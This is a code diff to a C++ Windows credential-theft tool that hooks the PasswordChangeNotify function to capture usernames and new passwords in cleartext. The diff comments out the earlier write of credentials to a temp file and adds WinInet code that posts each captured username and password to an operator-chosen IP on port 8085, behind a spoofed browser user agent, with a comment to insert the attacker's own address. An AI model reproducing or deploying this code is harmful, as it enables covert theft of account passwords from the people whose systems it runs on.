@@ -16,6 +16,9 @@
 
 #include "stdafx.h"
 #include "HookPasswordChange.h"
+#include <WinInet.h>
+#include <ntsecapi.h>
+#pragma comment(lib, "wininet.lib")
 
 using namespace std;
 
@@ -107,9 +110,6 @@ bool Hook_rassfm_PasswordChangeNotify()
 	return true;
 }
 
-
-
-
 NTSTATUS PasswordChangeNotifyHook(
     PUNICODE_STRING UserName,
     ULONG RelativeId,
@@ -127,14 +127,27 @@ NTSTATUS PasswordChangeNotifyHook(
 		wchar_t* password = new wchar_t[passwordLength];
 		memcpy(password, NewPassword->Buffer, NewPassword->Length);
 		memset(password+passwordLength-2, 0, 2);
-
+		
+		// You really *don't want* to save clear text creds at this phase!
+		/*
 		wofstream outFile;
 		outFile.open("c:\\windows\\temp\\passwords.txt", ios::app);
 		if (outFile.is_open())
 		{
 			outFile << wstring(userName) << L"\\" << wstring(password) << endl;
 			outFile.close();
-		}
+		}*/
+
+		HINTERNET hInternet = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+		// Update the following IP to match yours!
+		HINTERNET hSession = InternetConnect(hInternet, L"XX.XX.XX.XX", 8085, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); 
+		HINTERNET hReq = HttpOpenRequest(hSession, L"POST", L"/", NULL, NULL, NULL, 0, 0);
+		char* pBuf = "SomeData";
+
+		// Send the request.
+		InternetSetOption(hSession, INTERNET_OPTION_USERNAME, userName, userNameLength);
+		InternetSetOption(hSession, INTERNET_OPTION_PASSWORD, password, passwordLength);
+		HttpSendRequest(hReq, NULL, 0, pBuf, strlen(pBuf));
 	}
 
 	//Return control flow back to the original PasswordChangeNotify function
